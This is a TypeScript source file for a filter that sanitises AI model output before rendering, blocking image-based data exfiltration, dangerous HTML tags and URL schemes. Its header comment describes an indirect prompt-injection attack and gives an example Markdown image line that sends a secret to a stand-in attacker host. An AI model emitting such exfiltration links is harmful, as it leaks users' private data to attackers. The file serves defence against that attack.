import { stripInvisible } from './unicode';

/**
 * Egress filter for **model output** before you render it.
 *
 * A successful indirect injection often tries to exfiltrate data by making the
 * model emit `![x](https://evil.example/log?q=<secret>)` or an `<img>` tag —
 * the browser fetches it the moment it renders. This filter is **fail-closed**:
 *
 *  - Raw HTML outside code is escaped by default (`html: 'escape'`), so it
 *    renders as text. `html: 'filter'` keeps tags only after validating every
 *    resource-bearing attribute; anything it cannot parse is escaped.
 *  - Markdown images are parsed with CommonMark rules; an image whose target is
 *    not allow-listed — or that cannot be parsed — is neutralised.
 *  - Fenced code blocks and inline code are left untouched.
 *
 * Still render the result with a Markdown renderer that sanitises HTML
 * (e.g. markdown-it with `html: false`, or DOMPurify) — defence in depth.
 */
export interface SanitizeOutputOptions {
  /** Hosts allowed for images. Supports leading wildcard `*.example.com`. Default: none (relative URLs only). */
  allowedImageHosts?: string[];
  /** Hosts allowed for links. Default `'*'` (links need a click; images do not). */
  allowedLinkHosts?: string[] | '*';
  /** Remove invisible / tag characters. Default `true`. */
  stripInvisible?: boolean;
  /** Replacement for removed images. Default `[image removed]`. */
  imagePlaceholder?: string;
  /**
   * Raw HTML outside code:
   * - `'escape'` (default): `<` becomes `&lt;`, so tags render as text. Autolinks are kept.
   * - `'filter'`: keep tags whose URLs are allowed; drop dangerous tags/attributes; escape the rest.
   * - `'allow'`: leave HTML untouched — only if your renderer sanitises HTML itself.
   */
  html?: 'escape' | 'filter' | 'allow';
}

export interface SanitizeOutputResult {
  text: string;
  removedUrls: string[];
  invisibleRemoved: number;
  /** Number of HTML tags escaped or dropped. */
  htmlEscaped: number;
}

export function hostAllowed(url: string, allowed: string[]): boolean {
  let host: string;
  try {
    host = new URL(url.startsWith('//') ? `https:${url}` : url).hostname.toLowerCase();
  } catch {
    return false;
  }
  return allowed.some((rule) => {
    const r = rule.toLowerCase();
    if (r.startsWith('*.')) return host === r.slice(2) || host.endsWith(r.slice(1));
    return host === r;
  });
}

/** A URL is "remote" if it has a scheme or is protocol-relative. */
const hasScheme = (u: string) => /^[a-z][a-z0-9+.-]*:/i.test(u.trim()) || u.trim().startsWith('//');
const DANGEROUS_SCHEME = /^\s*(?:javascript|vbscript|data|file):/i;

// ─── Code-span aware splitting ─────────────────────────────────────────────

interface Segment {
  code: boolean;
  text: string;
}

/** Split Markdown into code (fenced blocks, inline code) and prose segments. Linear time. */
function splitCode(md: string): Segment[] {
  const segments: Segment[] = [];
  const lines = md.split('\n');
  let prose: string[] = [];
  let fence: { char: string; len: number } | null = null;
  let code: string[] = [];
  const flushProse = () => {
    if (prose.length) segments.push(...splitInlineCode(prose.join('\n')));
    prose = [];
  };
  lines.forEach((line, i) => {
    const nl = i < lines.length - 1 ? '\n' : '';
    if (fence) {
      code.push(line + nl);
      const close = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line);
      if (close && close[1]![0] === fence.char && close[1]!.length >= fence.len) {
        segments.push({ code: true, text: code.join('') });
        code = [];
        fence = null;
      }
      return;
    }
    const open = /^ {0,3}(`{3,}|~{3,})/.exec(line);
    if (open) {
      if (prose.length) {
        prose[prose.length - 1] += '\n';
        flushProse();
      }
      fence = { char: open[1]![0]!, len: open[1]!.length };
      code = [line + nl];
      return;
    }
    prose.push(line);
    if (nl && i === lines.length - 1) prose.push('');
  });
  if (fence) segments.push({ code: true, text: code.join('') }); // unclosed fence runs to EOF
  if (prose.length) {
    const joined = prose.join('\n');
    segments.push(...splitInlineCode(joined));
  }
  return segments;
}

function splitInlineCode(text: string): Segment[] {
  const out: Segment[] = [];
  const runs = /`+/g;
  let last = 0;
  let m: RegExpExecArray | null;
  while ((m = runs.exec(text)) !== null) {
    const len = m[0].length;
    const closer = new RegExp(`(?<!\`)\`{${len}}(?!\`)`, 'g');
    closer.lastIndex = m.index + len;
    const c = closer.exec(text);
    if (!c) continue; // unmatched backticks are literal
    if (m.index > last) out.push({ code: false, text: text.slice(last, m.index) });
    out.push({ code: true, text: text.slice(m.index, c.index + len) });
    last = c.index + len;
    runs.lastIndex = last;
  }
  if (last < text.length) out.push({ code: false, text: text.slice(last) });
  return out;
}

// ─── Markdown inline parsing (CommonMark subset) ─────────────────────────────

/** Index just after the `]` matching the `[` at `open`, honouring nesting and escapes. */
function matchBracket(s: string, open: number): number {
  let depth = 0;
  for (let i = open; i < s.length && i < open + 1000; i++) {
    const ch = s[i];
    if (ch === '\\') {
      i++;
      continue;
    }
    if (ch === '[') depth++;
    else if (ch === ']' && --depth === 0) return i + 1;
    else if (ch === '\n' && s[i + 1] === '\n') return -1; // paragraph break
  }
  return -1;
}

/** Parse `(dest "title")` starting at `(`; returns the destination and end index. */
function parseInlineTarget(s: string, open: number): { url: string; end: number } | null {
  let i = open + 1;
  const skipWs = () => {
    let newlines = 0;
    while (i < s.length && /[ \t\n]/.test(s[i]!)) {
      if (s[i] === '\n' && ++newlines > 1) return false;
      i++;
    }
    return true;
  };
  if (!skipWs()) return null;
  let url = '';
  if (s[i] === '<') {
    const close = s.indexOf('>', i + 1);
    const nl = s.indexOf('\n', i + 1);
    if (close < 0 || (nl >= 0 && nl < close)) return null;
    url = s.slice(i + 1, close);
    i = close + 1;
  } else {
    let depth = 0;
    const start = i;
    for (; i < s.length; i++) {
      const ch = s[i]!;
      if (ch === '\\') {
        i++;
        continue;
      }
      if (/\s/.test(ch)) break;
      if (ch === '(') depth++;
      else if (ch === ')') {
        if (depth === 0) break;
        depth--;
      }
    }
    url = s.slice(start, i);
  }
  if (!skipWs()) return null;
  const q = s[i];
  if (q === '"' || q === "'" || q === '(') {
    const closeCh = q === '(' ? ')' : q;
    const close = s.indexOf(closeCh, i + 1);
    if (close < 0) return null;
    i = close + 1;
    if (!skipWs()) return null;
  }
  if (s[i] !== ')') return null;
  return { url, end: i + 1 };
}

const normLabel = (l: string) => l.trim().replace(/\s+/g, ' ').toLowerCase();

// ─── HTML ────────────────────────────────────────────────────────────────

const TAG_RE =
  /<(\/?)([a-zA-Z][\w:-]*)((?:\s+[^\s"'<>/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?)*)\s*(\/?)>/y;
const ATTR_RE = /([^\s"'<>/=]+)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s"'=<>`]+))?/g;
const BLOCKED_TAGS = new Set([
  'script',
  'style',
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'link',
  'meta',
  'base',
  'form',
  'svg',
  'math',
  'template',
  'noscript',
  'portal',
  'image',
]);
const URL_ATTRS = new Set([
  'src',
  'href',
  'poster',
  'background',
  'data',
  'action',
  'formaction',
  'xlink:href',
  'lowsrc',
  'dynsrc',
  'ping',
  'cite',
  'longdesc',
  'usemap',
  'codebase',
  'archive',
  'manifest',
  'icon',
]);
const SRCSET_ATTRS = new Set(['srcset', 'imagesrcset']);
/** Private-use sentinels marking spans already validated by the Markdown pass. */
const KEEP_OPEN = '\uE000';
const KEEP_CLOSE = '\uE001';
const AUTOLINK_RE = /<([a-z][a-z0-9+.-]{1,31}:[^\s<>]*)>/iy;

export function sanitizeModelOutput(
  markdown: string,
  options: SanitizeOutputOptions = {},
): SanitizeOutputResult {
  const imgHosts = options.allowedImageHosts ?? [];
  const linkHosts = options.allowedLinkHosts ?? '*';
  const placeholder = options.imagePlaceholder ?? '[image removed]';
  const htmlMode = options.html ?? 'escape';
  const removedUrls: string[] = [];
  let htmlEscaped = 0;
  let text = markdown;
  let invisibleRemoved = 0;

  if (options.stripInvisible ?? true) {
    const r = stripInvisible(text, { collectFindings: false });
    text = r.text;
    invisibleRemoved = r.removed;
  }
  text = text.replace(/[\uE000\uE001]/g, '');

  const imageOk = (raw: string) => {
    const url = raw.trim();
    if (DANGEROUS_SCHEME.test(url)) return false;
    return !hasScheme(url) || hostAllowed(url, imgHosts);
  };
  const linkOk = (raw: string) => {
    const url = raw.trim();
    if (DANGEROUS_SCHEME.test(url)) return false;
    if (linkHosts === '*' || !hasScheme(url)) return true;
    return /^mailto:/i.test(url) || hostAllowed(url, linkHosts);
  };

  const segments = splitCode(text);
  const imageLabels = new Set<string>();

  // Pass 1: inline images & links (prose only).
  for (const seg of segments) {
    if (seg.code) continue;
    seg.text = rewriteInline(seg.text);
  }

  // Pass 2: reference definitions.
  for (const seg of segments) {
    if (seg.code) continue;
    seg.text = seg.text.replace(
      /^ {0,3}\[([^\]\n]{1,999})\]:[ \t]*(?:<([^>\n]*)>|(\S+))[^\n]*$/gm,
      (line, label: string, angled: string | undefined, bare: string | undefined) => {
        const url = angled ?? bare ?? '';
        const usedByImage = imageLabels.has(normLabel(label));
        if ((usedByImage && !imageOk(url)) || !linkOk(url)) {
          removedUrls.push(url);
          return '';
        }
        return line;
      },
    );
  }

  // Pass 3: raw HTML.
  if (htmlMode !== 'allow') {
    for (const seg of segments) {
      if (seg.code) continue;
      seg.text = rewriteHtml(seg.text);
    }
  }

  const joined = segments
    .map((s) => s.text)
    .join('')
    .replace(/[\uE000\uE001]/g, '');
  return { text: joined, removedUrls, invisibleRemoved, htmlEscaped };

  function rewriteInline(s: string): string {
    let out = '';
    let i = 0;
    while (i < s.length) {
      const bang = s[i] === '!' && s[i + 1] === '[';
      const open = bang ? i + 1 : s[i] === '[' ? i : -1;
      if (open < 0) {
        out += s[i++];
        continue;
      }
      const afterLabel = matchBracket(s, open);
      if (afterLabel < 0) {
        // Unparseable: an image start is neutralised (fail closed), a "[" is literal.
        out += bang ? '\\![' : '[';
        i = open + 1;
        continue;
      }
      const label = s.slice(open + 1, afterLabel - 1);
      if (s[afterLabel] === '(') {
        const target = parseInlineTarget(s, afterLabel);
        if (target) {
          const ok = bang ? imageOk(target.url) : linkOk(target.url);
          if (ok) {
            out +=
              (bang ? '!' : '') +
              '[' +
              (bang ? label : rewriteInline(label)) +
              ']' +
              KEEP_OPEN +
              s.slice(afterLabel, target.end) +
              KEEP_CLOSE;
          } else {
            removedUrls.push(target.url);
            out += bang ? placeholder : rewriteInline(label);
          }
          i = target.end;
          continue;
        }
        if (bang) {
          out += '\\![';
          i = open + 1;
          continue;
        }
      }
      // Reference forms: ![alt][ref], ![ref][], ![ref]
      if (bang) {
        let ref = label;
        let end = afterLabel;
        if (s[afterLabel] === '[') {
          const close = s.indexOf(']', afterLabel + 1);
          if (close > 0 && !s.slice(afterLabel + 1, close).includes('\n')) {
            const explicit = s.slice(afterLabel + 1, close);
            if (explicit.trim()) ref = explicit;
            end = close + 1;
          }
        }
        imageLabels.add(normLabel(ref));
        out += s.slice(i, end);
        i = end;
        continue;
      }
      out += '[';
      i = open + 1;
    }
    return out;
  }

  function rewriteHtml(s: string): string {
    let out = '';
    let i = 0;
    while (i < s.length) {
      const lt = s.indexOf('<', i);
      const keep = s.indexOf(KEEP_OPEN, i);
      if (keep >= 0 && (lt < 0 || keep < lt)) {
        const close = s.indexOf(KEEP_CLOSE, keep);
        out += s.slice(i, close + 1);
        i = close + 1;
        continue;
      }
      if (lt < 0) {
        out += s.slice(i);
        break;
      }
      out += s.slice(i, lt);
      AUTOLINK_RE.lastIndex = lt;
      const auto = AUTOLINK_RE.exec(s);
      if (auto) {
        if (linkOk(auto[1]!)) out += auto[0];
        else {
          removedUrls.push(auto[1]!);
          out += auto[1]!.replace(/:/, '&#58;');
        }
        i = lt + auto[0].length;
        continue;
      }
      if (htmlMode === 'filter') {
        TAG_RE.lastIndex = lt;
        const tag = TAG_RE.exec(s);
        if (tag && tagAllowed(tag[2]!.toLowerCase(), tag[1] === '/', tag[3] ?? '')) {
          out += tag[0];
          i = lt + tag[0].length;
          continue;
        }
        if (tag) {
          // Known-bad tag: drop it entirely.
          htmlEscaped++;
          i = lt + tag[0].length;
          continue;
        }
      }
      // Escape mode, or anything we could not parse: render "<" as text.
      if (/[a-zA-Z/!?]/.test(s[lt + 1] ?? '')) htmlEscaped++;
      out += '&lt;';
      i = lt + 1;
    }
    return out;
  }

  function tagAllowed(name: string, closing: boolean, attrs: string): boolean {
    if (BLOCKED_TAGS.has(name)) return false;
    if (closing) return true;
    ATTR_RE.lastIndex = 0;
    let m: RegExpExecArray | null;
    while ((m = ATTR_RE.exec(attrs)) !== null) {
      const attr = m[1]!.toLowerCase();
      const value = (m[2] ?? '').replace(/^["']|["']$/g, '');
      if (attr.startsWith('on') || attr === 'style' || attr === 'formaction') {
        if (attr === 'style' && !/url\s*\(|expression\s*\(|@import|image-set\s*\(/i.test(value))
          continue;
        return reject(value || attr);
      }
      if (URL_ATTRS.has(attr)) {
        const ok = attr === 'href' && name === 'a' ? linkOk(value) : imageOk(value);
        if (!ok) return reject(value);
      } else if (SRCSET_ATTRS.has(attr)) {
        for (const candidate of value.split(',')) {
          const url = candidate.trim().split(/\s+/)[0] ?? '';
          if (url && !imageOk(url)) return reject(url);
        }
      }
    }
    return true;
  }

  function reject(url: string): false {
    removedUrls.push(url);
    return false;
  }
}
